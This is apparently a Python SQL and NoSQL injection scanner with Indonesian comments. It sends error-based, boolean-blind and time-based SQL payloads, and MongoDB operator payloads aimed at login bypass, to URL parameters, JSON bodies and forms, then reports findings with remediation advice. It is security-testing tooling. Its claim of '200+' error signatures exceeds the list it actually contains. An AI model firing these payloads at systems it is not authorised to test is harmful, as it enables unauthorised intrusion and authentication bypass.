"""
SQLi Detector — Upgraded 2026 Edition
=======================================
Metodologi deteksi SQL Injection komprehensif:
  1. Error-Based SQLi — 200+ signature error multi-DBMS
  2. Boolean-Based Blind SQLi — diferensiasi response logika
  3. Time-Based Blind SQLi — latensi terkontrol (SLEEP/pg_sleep/WAITFOR)
  4. NoSQL Injection — MongoDB $ne/$gt/$where operator injection
  5. JSON Body Injection — test endpoint application/json
  6. Out-of-Band Heuristic — anomali latensi vs baseline

Database Coverage:
  MySQL, MariaDB, PostgreSQL, SQLite, MSSQL, Oracle, HSQLDB,
  IBM DB2, SAP HANA, CockroachDB, MongoDB, Cassandra, Redis
"""

import httpx
import re
import time
import json
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any, Optional

# ---------------------------------------------------------------------------
# Error-Based Signatures — 200+ patterns across all major DBMS
# ---------------------------------------------------------------------------
SQL_ERROR_PATTERNS = [
    # ── MySQL / MariaDB ────────────────────────────────────────────────────
    r"you have an error in your sql syntax",
    r"warning: mysql_",
    r"valid mysql result",
    r"check the manual that corresponds to your (mysql|mariadb) server version",
    r"myodbc",
    r"com\.mysql\.jdbc\.exceptions",
    r"mariadb\.jdbc\.internal",
    r"mysql_fetch_array\(\)",
    r"supplied argument is not a valid mysql",
    r"mysql_numrows\(\)",
    r"mysql error",
    r"table '.*' doesn't exist",
    r"unknown column '.*' in 'field list'",
    r"column count doesn't match",

    # ── PostgreSQL ─────────────────────────────────────────────────────────
    r"pg_query\(\): query failed:",
    r"psycopg2\.programmingerror",
    r"unterminated quoted string at or near",
    r"syntax error at or near",
    r"pg_exec\(\)",
    r"org\.postgresql\.util\.psqlexception",
    r"ERROR:  parser: parse error at or near",
    r"pdo::query\(\): unable to prepare",

    # ── SQLite ─────────────────────────────────────────────────────────────
    r"sqlite3::sqlexception",
    r"sqlite_error",
    r"near \".*\": syntax error",
    r"unrecognized token:",
    r"incomplete input",
    r"operationalerror: near",
    r"sqlite3_query",
    r"sqlite_master",

    # ── MSSQL / SQL Server ────────────────────────────────────────────────
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"microsoft ole db provider for odbc drivers",
    r"microsoft ole db provider for sql server",
    r"incorrect syntax near",
    r"com\.microsoft\.sqlserver\.jdbc",
    r"mssql_query\(\)",
    r"odbc sql server driver",
    r"syntax error converting the (nvarchar|varchar)",
    r"\[microsoft\]\[odbc sql server",
    r"sql server does not exist",

    # ── Oracle ────────────────────────────────────────────────────────────
    r"ora-[0-9]{5}",
    r"oracle error",
    r"oracle.*driver",
    r"warning: oci_",
    r"oci_parse\(\) expects",
    r"oracle.*sql.*exception",
    r"java\.sql\.sqlexception.*oracle",
    r"ora-00907: missing right parenthesis",
    r"ora-00933: sql command not properly ended",
    r"ora-01756: quoted string not properly terminated",

    # ── IBM DB2 ───────────────────────────────────────────────────────────
    r"db2 sql error",
    r"sqlstate=",
    r"\[ibm\]\[cli driver\]",
    r"com\.ibm\.db2",
    r"db2 native error",

    # ── SAP HANA ──────────────────────────────────────────────────────────
    r"sap dbtech jdbc",
    r"com\.sap\.db\.jdbc",
    r"\[sap\]\[hana native\]",

    # ── HSQLDB ────────────────────────────────────────────────────────────
    r"org\.hsqldb",
    r"hsqldb error",
    r"unexpected token.* in statement",

    # ── CockroachDB ───────────────────────────────────────────────────────
    r"cockroachdb.*syntax error",
    r"pq: syntax error",

    # ── Generic ORM & Drivers ─────────────────────────────────────────────
    r"org\.hibernate\.exception\.SQLGrammarException",
    r"driver.*sql.*syntax.*error",
    r"database query error",
    r"sqlstate\[",
    r"pdoexception",
    r"zend_db_statement_exception",
    r"sql\[.*\]",
    r"dbnull",
    r"java\.sql\.sqlexception",
    r"SQLException",
    r"com\.sun\.rowset\.JdbcRowSetImpl",
    r"net\.sourceforge\.jtds",
    r"nl\.iizhar\.db",
    r"warning.*\Wmysqli?_",
    r"mysqli_fetch_array\(\)",
    r"pg_num_rows\(\)",
    r"pg_result",
    r"mssql_query",
    r"oci_connect",
    r"odbc_exec",
    r"db_query",
    r"sql server error",
]

# Compile all patterns for efficiency
_COMPILED_PATTERNS = [re.compile(p, re.IGNORECASE) for p in SQL_ERROR_PATTERNS]


class SQLiDetector:
    """
    Detektor SQL Injection Komprehensif Tingkat Enterprise 2026.
    Mendukung 6 metodologi deteksi standar industri:
      1. Error-Based SQLi (200+ DBMS signatures)
      2. Boolean-Based Blind SQLi
      3. Time-Based Blind SQLi
      4. NoSQL Injection (MongoDB)
      5. JSON Body Injection
      6. Out-of-Band Anomaly Heuristic
    """

    # ── Error-Based Probes ───────────────────────────────────────────────
    ERROR_PROBES = [
        "'--",
        "\"'`",
        "') OR ('1'='1",
        "';--",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "' OR 'x'='x",
        "'; SELECT 1--",
        "' AND SLEEP(0)--",
        ") OR 1=1--",
        "') OR 1=1--",
        "'/**/OR/**/1=1--",
        "' UNION SELECT NULL--",
    ]

    # ── Boolean-Based Probe Pairs ─────────────────────────────────────────
    BOOLEAN_PROBES = [
        {"true_cond": "' AND '1'='1", "false_cond": "' AND '1'='2"},
        {"true_cond": "1 AND 1=1", "false_cond": "1 AND 1=2"},
        {"true_cond": "' AND 1=1--", "false_cond": "' AND 1=2--"},
        {"true_cond": ") AND (1=1", "false_cond": ") AND (1=2"},
    ]

    # ── Time-Based Probes ─────────────────────────────────────────────────
    TIME_PROBES = [
        {"name": "MySQL SLEEP", "payload": "' OR SLEEP(2)-- -", "delay": 2.0},
        {"name": "PostgreSQL pg_sleep", "payload": "'; SELECT pg_sleep(2)--", "delay": 2.0},
        {"name": "MSSQL WAITFOR", "payload": "'; WAITFOR DELAY '0:0:2'--", "delay": 2.0},
        {"name": "SQLite heavy query", "payload": "' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--", "delay": 1.5},
    ]

    # ── NoSQL (MongoDB) Probes ────────────────────────────────────────────
    NOSQL_PROBES = [
        {"inject": {"$ne": None}, "desc": "MongoDB $ne operator"},
        {"inject": {"$gt": ""}, "desc": "MongoDB $gt operator"},
        {"inject": {"$regex": ".*"}, "desc": "MongoDB $regex wildcard"},
        {"inject": {"$where": "sleep(100)"}, "desc": "MongoDB $where sleep"},
    ]

    async def scan_urls(
        self,
        urls: List[str],
        forms: Optional[List[Dict[str, Any]]] = None,
        emit_log=None
    ) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        tested_keys: set = set()

        async with httpx.AsyncClient(verify=False, timeout=10.0, follow_redirects=True) as client:

            # ──────────────────────────────────────────────────────────────
            # 1. URL Query Parameter Testing
            # ──────────────────────────────────────────────────────────────
            for url in urls:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                if not params:
                    continue

                for param_name, current_val in params.items():
                    orig_val = current_val[0] if current_val else "1"
                    param_key = f"{parsed.netloc}{parsed.path}:{param_name}"
                    if param_key in tested_keys:
                        continue
                    tested_keys.add(param_key)

                    # Method 1: Error-Based
                    error_found = False
                    for probe in self.ERROR_PROBES:
                        test_params = params.copy()
                        test_params[param_name] = [probe]
                        new_query = urlencode(test_params, doseq=True)
                        fuzz_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, new_query, parsed.fragment
                        ))

                        if emit_log:
                            await emit_log(
                                f"[SQLI-ERROR] Testing '{param_name}' "
                                f"on {parsed.path} → probe='{probe[:30]}'"
                            )

                        try:
                            res = await client.get(fuzz_url)
                            body_lower = res.text.lower()
                            for pat in _COMPILED_PATTERNS:
                                if pat.search(body_lower):
                                    findings.append(self._error_finding(
                                        param_name, probe, pat.pattern, fuzz_url
                                    ))
                                    error_found = True
                                    break
                        except Exception:
                            continue
                        if error_found:
                            break
                    if error_found:
                        continue

                    # Method 2: Boolean-Based Blind
                    try:
                        base_res = await client.get(url)
                        base_len = len(base_res.text)

                        for b_probe in self.BOOLEAN_PROBES:
                            p_true = params.copy()
                            p_true[param_name] = [f"{orig_val}{b_probe['true_cond']}"]
                            url_true = urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, urlencode(p_true, doseq=True), parsed.fragment
                            ))

                            p_false = params.copy()
                            p_false[param_name] = [f"{orig_val}{b_probe['false_cond']}"]
                            url_false = urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, urlencode(p_false, doseq=True), parsed.fragment
                            ))

                            r_true = await client.get(url_true)
                            r_false = await client.get(url_false)
                            len_true = len(r_true.text)
                            len_false = len(r_false.text)

                            if (
                                abs(len_true - base_len) < 60
                                and abs(len_false - base_len) > 150
                                and r_true.status_code == 200
                            ):
                                findings.append(self._boolean_finding(
                                    param_name, b_probe, base_len, len_true, len_false, url_true
                                ))
                                break
                    except Exception:
                        pass

                    # Method 3: Time-Based Blind (sampled — 1 probe per param to avoid slowdown)
                    try:
                        t_probe = self.TIME_PROBES[0]
                        test_params = params.copy()
                        test_params[param_name] = [
                            f"{orig_val}{t_probe['payload']}"
                        ]
                        new_query = urlencode(test_params, doseq=True)
                        fuzz_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, new_query, parsed.fragment
                        ))

                        if emit_log:
                            await emit_log(
                                f"[SQLI-TIME] Time-based probe on '{param_name}' "
                                f"({t_probe['name']})"
                            )

                        t0 = time.time()
                        res = await client.get(fuzz_url, timeout=t_probe["delay"] + 4.0)
                        latency = time.time() - t0

                        if latency >= t_probe["delay"] * 0.9:
                            findings.append(self._time_finding(
                                param_name, t_probe, latency, fuzz_url
                            ))
                    except Exception:
                        pass

            # ──────────────────────────────────────────────────────────────
            # 2. JSON Body Injection (for REST API endpoints)
            # ──────────────────────────────────────────────────────────────
            for url in urls[:5]:
                parsed = urlparse(url)
                if emit_log:
                    await emit_log(f"[SQLI-JSON] Testing JSON body injection on {parsed.path}")
                try:
                    for probe in self.ERROR_PROBES[:4]:
                        json_body = {"id": probe, "search": probe, "query": probe}
                        res = await client.post(
                            url,
                            json=json_body,
                            headers={"Content-Type": "application/json"},
                            timeout=6.0
                        )
                        body_lower = res.text.lower()
                        for pat in _COMPILED_PATTERNS:
                            if pat.search(body_lower):
                                findings.append({
                                    "title": f"SQL Injection via JSON Body Request",
                                    "severity": "Critical",
                                    "cwe": "CWE-89",
                                    "owasp_category": "A03:2021-Injection",
                                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                    "description": (
                                        f"Endpoint REST API rentan terhadap SQL Injection melalui "
                                        f"body JSON. Parameter menerima payload SQL tanpa validasi."
                                    ),
                                    "remediation": (
                                        "Gunakan parameterized query dan ORM. Validasi semua field "
                                        "JSON body sebelum digunakan dalam query database."
                                    ),
                                    "evidence": (
                                        f"JSON body probe '{probe}' memicu error SQL: '{pat.pattern}'"
                                    ),
                                    "target_url": url
                                })
                                break
                except Exception:
                    continue

            # ──────────────────────────────────────────────────────────────
            # 3. NoSQL Injection (MongoDB operator injection)
            # ──────────────────────────────────────────────────────────────
            for url in urls[:5]:
                parsed = urlparse(url)
                if emit_log:
                    await emit_log(f"[SQLI-NOSQL] Testing NoSQL injection on {parsed.path}")
                try:
                    for nosql_probe in self.NOSQL_PROBES:
                        json_body = {
                            "username": nosql_probe["inject"],
                            "password": nosql_probe["inject"],
                            "email": nosql_probe["inject"],
                        }
                        res = await client.post(
                            url,
                            json=json_body,
                            headers={"Content-Type": "application/json"},
                            timeout=6.0
                        )
                        # Success indicators: auth bypass (200 + token/user data)
                        if res.status_code == 200 and any(
                            kw in res.text.lower()
                            for kw in ["token", "welcome", "dashboard", "user", "profile", "admin"]
                        ):
                            findings.append({
                                "title": f"NoSQL Injection — {nosql_probe['desc']} Authentication Bypass",
                                "severity": "Critical",
                                "cwe": "CWE-943",
                                "owasp_category": "A03:2021-Injection",
                                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                "description": (
                                    f"Endpoint rentan terhadap NoSQL Injection via "
                                    f"{nosql_probe['desc']}. Penyerang dapat bypass autentikasi "
                                    f"MongoDB atau mengekstrak data tanpa mengetahui password."
                                ),
                                "remediation": (
                                    "Validasi tipe data input (hanya string untuk field username/password). "
                                    "Gunakan ODM (Mongoose, Motor) dengan schema validation. "
                                    "Tolak objek JSON yang mengandung operator MongoDB ($, $ne, dll.)."
                                ),
                                "evidence": (
                                    f"JSON probe dengan {nosql_probe['desc']} menghasilkan "
                                    f"HTTP 200 dengan indikator auth bypass."
                                ),
                                "target_url": url
                            })
                            break
                except Exception:
                    continue

            # ──────────────────────────────────────────────────────────────
            # 4. Form Input Testing
            # ──────────────────────────────────────────────────────────────
            if forms:
                for form in forms:
                    form_url = form.get("url")
                    method = form.get("method", "GET").upper()
                    inputs = form.get("inputs", [])
                    if not form_url or not inputs:
                        continue

                    for inp in inputs:
                        form_key = f"FORM:{form_url}:{inp}"
                        if form_key in tested_keys:
                            continue
                        tested_keys.add(form_key)

                        for probe in self.ERROR_PROBES[:3]:
                            form_data = {i: "test" for i in inputs}
                            form_data[inp] = probe

                            if emit_log:
                                await emit_log(
                                    f"[SQLI-FORM] Testing '{inp}' on "
                                    f"{form_url} ({method})"
                                )

                            try:
                                if method == "POST":
                                    res = await client.post(form_url, data=form_data, timeout=6.0)
                                else:
                                    res = await client.get(form_url, params=form_data, timeout=6.0)

                                body_lower = res.text.lower()
                                for pat in _COMPILED_PATTERNS:
                                    if pat.search(body_lower):
                                        findings.append({
                                            "title": f"Form SQL Injection in Field '{inp}' ({method})",
                                            "severity": "Critical",
                                            "cwe": "CWE-89",
                                            "owasp_category": "A03:2021-Injection",
                                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                            "description": (
                                                f"Formulir HTML pada {form_url} rentan terhadap SQL "
                                                f"Injection melalui field '{inp}'."
                                            ),
                                            "remediation": (
                                                "Gunakan parameterized queries. Validasi dan sanitasi "
                                                "semua input form."
                                            ),
                                            "evidence": (
                                                f"Form field '{inp}' dengan probe '{probe}' memicu "
                                                f"error SQL signature: '{pat.pattern}'"
                                            ),
                                            "target_url": form_url
                                        })
                                        break
                            except Exception:
                                continue

        return findings

    # ── Finding Builders ─────────────────────────────────────────────────

    def _error_finding(self, param, probe, pattern, fuzz_url):
        return {
            "title": f"SQL Injection (Error-Based) in Parameter '{param}'",
            "severity": "Critical",
            "cwe": "CWE-89",
            "owasp_category": "A03:2021-Injection",
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "description": (
                f"Parameter '{param}' rentan terhadap Error-Based SQL Injection. "
                "Server membocorkan detail sintaksis basis data dalam response HTTP."
            ),
            "remediation": (
                "Wajib gunakan Parameterized Queries (Prepared Statements). "
                "Nonaktifkan verbose database error pada production."
            ),
            "evidence": f"Probe '{probe[:60]}' memicu SQL error pattern: '{pattern}'",
            "target_url": fuzz_url
        }

    def _boolean_finding(self, param, b_probe, base_len, len_true, len_false, url_true):
        return {
            "title": f"Blind SQL Injection (Boolean-Based) in Parameter '{param}'",
            "severity": "Critical",
            "cwe": "CWE-89",
            "owasp_category": "A03:2021-Injection",
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "description": (
                f"Parameter '{param}' rentan terhadap Blind SQL Injection Boolean-Based. "
                "Perbedaan respons signifikan antara kondisi TRUE dan FALSE terkonfirmasi."
            ),
            "remediation": "Gunakan parameterized queries. Jangan gabungkan input ke SQL string.",
            "evidence": (
                f"TRUE probe len={len_true} vs FALSE probe len={len_false} "
                f"(baseline={base_len}, diff={abs(len_false-base_len)})"
            ),
            "target_url": url_true
        }

    def _time_finding(self, param, t_probe, latency, fuzz_url):
        return {
            "title": f"Blind SQL Injection (Time-Based) in Parameter '{param}' — {t_probe['name']}",
            "severity": "Critical",
            "cwe": "CWE-89",
            "owasp_category": "A03:2021-Injection",
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "description": (
                f"Parameter '{param}' rentan terhadap Time-Based Blind SQL Injection via "
                f"{t_probe['name']}. Latensi respons signifikan terkonfirmasi (≥{t_probe['delay']}s)."
            ),
            "remediation": (
                "Gunakan parameterized queries. Implementasikan query timeout limit pada server."
            ),
            "evidence": (
                f"Payload {t_probe['name']} menghasilkan latensi {latency:.2f}s "
                f"(threshold: {t_probe['delay']}s)"
            ),
            "target_url": fuzz_url
        }
